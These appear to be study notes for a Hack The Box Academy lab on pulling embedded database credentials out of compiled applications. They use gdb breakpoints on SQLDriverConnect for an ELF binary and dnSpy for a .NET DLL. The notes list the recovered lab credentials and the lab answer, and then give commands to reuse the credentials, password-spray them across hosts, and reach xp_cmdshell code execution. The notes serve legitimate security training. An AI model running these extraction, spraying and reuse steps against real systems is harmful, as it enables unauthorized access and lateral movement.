# Section 28 — Attacking Applications Connecting to Services

Compiled apps (ELF binaries, .NET DLLs, thick clients) that talk to a database/API almost always carry an **embedded connection string with credentials**. Recover those creds by analysing the binary, then **reuse them** (DB access, password spray, lateral movement) — service accounts like MSSQL `SA` are frequently reused network-wide.

---

## Part A — ELF binary (`octopus_checker`)

Running it shows it tries to connect to a DB and verify availability:
```
$ ./octopus_checker
Program had started..
Attempting Connection
... [unixODBC][Driver Manager] Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
```
> The missing-driver error is irrelevant — the credentials are passed to `SQLDriverConnect()` **before** the driver loads, so we just need to read that argument.

### Why `strings` fails
The connection string is **built on the stack in reversed byte-order chunks** (you can see this in `disas main` — many `call`s loading short reversed fragments). It's never a single contiguous literal, so `strings`/`grep` won't reveal it. You must catch it **assembled at runtime**, at the `SQLDriverConnect` call.

### Method 1 — gdb breakpoint (taught method)
```bash
gdb ./octopus_checker
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main                 # find the call to SQLDriverConnect@plt
gdb-peda$ b *0x5555555551b0           # the SQLDriverConnect@plt address
gdb-peda$ run
# at the breakpoint, the connection string is in RDX:
gdb-peda$ x/s $rdx
```
> SQLDriverConnect's 3rd argument (`InConnectionString`) lands in **RDX** per the System V AMD64 calling convention (args: RDI, RSI, **RDX**, RCX…). Break on the call, dump RDX as a string → the full DSN with creds.

### Method 2 — gdb batch one-liner (used here, scriptable/headless)
```bash
gdb -q -nx -batch \
  -ex 'set pagination off' -ex 'set breakpoint pending on' \
  -ex 'break SQLDriverConnect' -ex 'run' \
  -ex 'printf "%s\n", (char*)$rdx' -ex 'quit' ./octopus_checker
```
✅ **Verified output (ACADEMY-ACA-ROLLOUT):**
```
Breakpoint 1, SQLDriverConnect (hdbc=..., conn_str_in=0x7fffffffe620
  "DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;" ...)
RDX = DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;
```
> `break SQLDriverConnect` (by symbol, no need for the PLT address) + `-batch` + `printf "%s",(char*)$rdx` extracts it in one non-interactive command — no gdb session to drive. `-nx` skips `.gdbinit`/peda for clean output; `set breakpoint pending on` lets the breakpoint resolve once the ODBC lib loads. Because unixODBC ships debug info, gdb even pretty-prints `conn_str_in` for free.

> **Gotcha:** `ltrace -e SQLDriverConnect ./octopus_checker` **did not** capture the call here (C++ binary, library call via PLT — ltrace's symbol filter missed it). Don't burn time on ltrace for this; go straight to the gdb breakpoint.

### ✅ Answer
**§28 Q1 — credentials for the local DB instance → `SA:N0tS3cr3t!`**
> Runtime value → extracted live from the binary on the box (gdb @ `SQLDriverConnect`, RDX), not taken from the module's redacted `UID=username;PWD=password` example (the §22 rule).

### Reuse the creds
```bash
mssqlclient.py SA:'N0tS3cr3t!'@10.129.205.20 -p 1401
nxc mssql 10.129.205.20 -u SA -p 'N0tS3cr3t!' --local-auth
# then password-spray the same PW across SMB/SSH/other hosts — service creds are often reused
```
> `SA` is the MSSQL sysadmin account → `xp_cmdshell` RCE if you can reach the instance. Always test the recovered password against other users/services on the network.

---

## Part B — .NET DLL (`MultimasterAPI.dll`)

```powershell
Get-FileMetaData .\MultimasterAPI.dll      # -> ".NETFramework v4.6.1", api/getColleagues, http://localhost:8081
```
> Metadata confirms it's a **.NET assembly** (managed code) and leaks endpoint hints. .NET = decompilable to near-original C#/VB source.

Open in **dnSpy** (decompiler + debugger for .NET):
```
dnSpy MultimasterAPI.dll
  -> MultimasterAPI.Controllers -> ColleagueController
     -> SqlConnection("Server=...;Database=...;User Id=...;Password=...;")
```
> dnSpy reads managed assemblies straight back to source — connection strings, API keys, and logic are right there in the `Controller`. (For obfuscated assemblies, run **de4dot** first — see §21.) No debugging needed for plaintext literals; for computed/encrypted ones, set a breakpoint after the build and read it (same trick as §21/§22).

---

## Exam Notes

- **Any binary that connects to a DB/API carries creds** — ELF: gdb @ the connect call; .NET: dnSpy; native Win: x64dbg/strings; thick client: §21/§22 methods.
- **`strings` failing ≠ no secret.** Stack-assembled / reversed / encrypted strings only exist at runtime → breakpoint the connect/auth call and read the argument register (**RDX = 3rd arg, x86-64 SysV**).
- **gdb batch `printf "%s",(char*)$reg`** turns binary cred-extraction into a one-liner — scriptable over SSH, no interactive session.
- **ltrace can miss C++/PLT library calls** — fall back to a gdb symbol breakpoint.
- **Recovered DB creds → always reuse-test**: MSSQL `SA` → `xp_cmdshell` RCE; password-spray the same secret across users/hosts.
- Connection-string arg order: `SQLDriverConnect(hdbc, hwnd, InConnString, ...)` → InConnString in RDX.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@10.129.205.20  (HTB_@cademy_stdnt!) ; ls ~  -> octopus_checker
2. ./octopus_checker  -> tries DB connect (driver-missing error is fine)
3. gdb -q -nx -batch -ex 'set breakpoint pending on' -ex 'break SQLDriverConnect' \
       -ex run -ex 'printf "%s\n",(char*)$rdx' -ex quit ./octopus_checker
4. -> DRIVER={...};SERVER=localhost,1401;UID=SA;PWD=N0tS3cr3t!;
5. §28 Q1 answer = SA:N0tS3cr3t!   ✅ (verified live)
6. reuse: mssqlclient.py / nxc mssql with SA:N0tS3cr3t!  -> xp_cmdshell / spray
```

> One line: the secret is only assembled in memory at the `SQLDriverConnect` call — breakpoint there, read RDX, done. Then treat the DB password as a network-wide spray candidate.
